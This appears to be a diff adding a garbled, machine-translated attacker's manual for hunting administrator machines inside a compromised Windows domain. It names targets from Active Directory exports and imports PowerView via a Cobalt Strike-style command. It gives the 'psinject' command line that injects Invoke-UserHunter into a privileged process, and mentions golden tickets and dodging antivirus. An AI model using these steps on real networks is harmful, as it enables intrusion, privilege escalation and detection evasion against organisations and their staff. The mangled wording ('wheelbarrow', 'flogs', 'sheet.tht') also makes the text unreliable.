@@ -1,0 +1,20 @@
+I'll tell you another moment about ad_users, there is a lot of information about employees, there you can find techies, engineers, etc. We usually need ad_users when we want to find the admin's wheelbarrow, because on the admin's wheelbarrows we can find flogs from the antivirus console, from cloud backups, etc. Now I will throw off the manual for YUZERHUNTER, with the help of it, we find these cars. We also need ad_users to get the SID from there for a golden ticket, but more on that later
+
+1. make a list of targets
+1.1 We open ad_users, we are looking for who we are potentially interested in: admin / engineer / inform technologists / IT
+take account logins from sAMAccountName
+1.2 We take a list of domain admins
+1.3 put the first and second in the file list.txt
+
+2. Load power view.
+2.1 powershell-import /home /user/soft/powerview/view.ps1
+2.1 - comment: importing power view from /home/user/soft/powerview/view.ps1
+
+2.3 Cutting in hunting
+2.3.1
+psinject 1884 x64 Invoke-UserHunter -Threads 20 -UserFile C:\ProgramData\list.txt >> C:\ProgramData\out.txt
+
+instead of 1884 - the PID process where we have enough rights to make an injection.
+x64 - or x86 bit of the process. see in the tasklist
+In s \ programdata \ sheet.tht there should be a list that we did in point # 1.
+in 5-10-20 minutes watch the result in out.tht. As soon as it finishes, it replenishes it at once. that is, if the file is 0 bytes, it means that it works or the AV has burned (if you have burned it, then you will see it in the koba)
